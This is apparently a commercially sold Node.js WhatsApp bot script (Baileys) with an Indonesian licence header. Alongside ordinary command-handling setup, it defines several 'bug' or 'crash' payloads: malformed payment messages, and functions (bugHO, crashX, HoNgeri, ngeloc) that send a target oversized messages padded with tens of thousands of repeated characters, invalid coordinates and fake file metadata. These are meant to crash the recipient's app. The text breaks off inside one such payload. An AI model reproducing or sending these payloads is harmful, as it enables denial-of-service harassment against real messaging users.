/*
   SC INI DI JUAL RESMI OLEH ZYNXZOO

HAK GUNA PEMBELI
1.MENGGUNAKAN
2.TIDAK MELAKUKAN RENAME/RECODE
3.TIDAK MENJUALNYA TANPA IZIN PEMILIK
4.MALANGGAR 3 KETENTUAN DI ATAS ? SANGSINYA TENGGUNG SENDIRI AJA

BASE : ZYNXZOO
CREATE : ZYNXZOO

YOUTUBE : https://youtube.com/@zynxzooo
CH TELE : https://t.me/ZynXzooo
CH PUBLIC : https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L
*/
const {
zynxzoConnect,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
useMultiFileAuthState,
makeWASocket,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const jimp = require("jimp")
const fetch = require("node-fetch")
const speed = require("performance-now")
const moment = require("moment-timezone")
const pino = require("pino")
const { spawn: spawn, exec } = require("child_process")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const fg = require("api-dylux")
const path = require("path")
const cheerio = require("cheerio")
const ytdl = require("ytdl-core")
const chalk = require("chalk")
const { color } = require("../dbaseee/lib/color")
const FormData = require("form-data")
const crypto = require("crypto")
const yts = require("yt-search")
const bochil = require("@bochilteam/scraper")
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
module.exports = zynxzo = handler = async (zynxzo, m, chatUpdate, store) => {
try {
//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
require("../config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom
} = require("../dbaseee/lib/myfunction")
const { remini } = require("../dbaseee/lib/remini")
const { toPTT, toAudio } = require("../dbaseee/lib/converter")
const { UploadFileUgu, webp2mp4File, floNime, TelegraPh } = require("../dbaseee/lib/uploader")
const { toTelegra } = require("../dbaseee/lib/upload")
//=================================================//
const {
groupMembers
} = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await zynxzo.decodeJid(zynxzo.user.id)
const itsMe = m.sender == botNumber ? true : false
const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../dbaseee/dtbs/premium.json'), 'utf8'))
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../dbaseee/dtbs/owner.json'), 'utf8'))
const isDeveloper = [
botNumber, ...kontributor, ...global.owner
].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = [
botNumber, ...kontributor, ...itsOrkay, ...global.owner
].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
//=================================================//
//Group
const groupMetadata = m.isGroup ? await zynxzo.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
//
const dead = fs.readFileSync(`./image/dead.jpg`)
const logozynxzo = fs.readFileSync(`./image/zynxzo.jpg`)
const anime = fs.readFileSync(`./image/anime.jpg`)
const kosongjpg = fs.readFileSync(`./image/kosong.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/fake.apk`)
const fakejpg = fs.readFileSync(`./src/fake.jpg`)
//
const zynxzoUp = fs.readFileSync(`./img/zynxzo-.jpg`)
const zynxzo1 = fs.readFileSync(`./img/zynxzo1.jpg`)
const zynxzo2 = fs.readFileSync(`./img/zynxzo2.jpg`)
const zynxzo3 = fs.readFileSync(`./img/zynxzo3.jpg`)
//
const zetAttack = ["http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg"]
const zynxzoAttack = zetAttack[Math.floor(Math.random() * zetAttack.length)]
//=================================================//
const roboto = fs.readFileSync(path.resolve(__dirname, '../dbaseee/font/roboto-negro.ttf'))
//=================================================//
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Good night"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄 Good afternoon"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️ Good afternoon"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️ Good morning"
} else {
ucapanWaktu = "🌆 Good morning"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", {
weekday: "long"
})
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
async function loading () {
var gen2 = [
"𝙉𝙤",
"𝘾𝙤𝙪𝙣𝙩𝙚𝙧",
"𝙕𝙮𝙣𝙭𝙯𝙤 𝙉𝙤 𝘾𝙤𝙪𝙣𝙩𝙚𝙧"
]
let { key } = await zynxzo.sendMessage(m.chat, {text: '𝙕𝙮𝙣𝙭𝙯𝙤'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await zynxzo.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}
//=================================================//
//React Feature 
const successreact = ['✅']
const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
const taskdone =  (teks) => {
  return zynxzo.sendMessage(m.chat, { react: { text: teks, key: m.key }}) 
}

// React Feature
const moji = ['💢',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]
 const inireact =  (teks) => {
  return zynxzo.sendMessage(m.chat, { react: { text: teks, key: m.key }}) 
}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍MODS,ATTACKER ╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}


//=================================================//
async function bugHO(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function crashX(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴ ₳฿ɆӾⱫ ​᭄⃢₵Ɽ₳₴Ⱨ⃝ ☠️⃝🔥V̘̪͆̂̅I̍̅̀̎̊R͉̜̎͡͠U̠҉̷̙ͦ₴̵̵̙͕̙͕̀̃̀̃A̷͙ͭͫ̕T̨͈͗̌ͥT̨͈͗̌ͥA̷͙ͭͫ̕C̵͉͋̔͞K͕͓͌̎̾🔥✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function HoNgeri(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function ngeloc(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
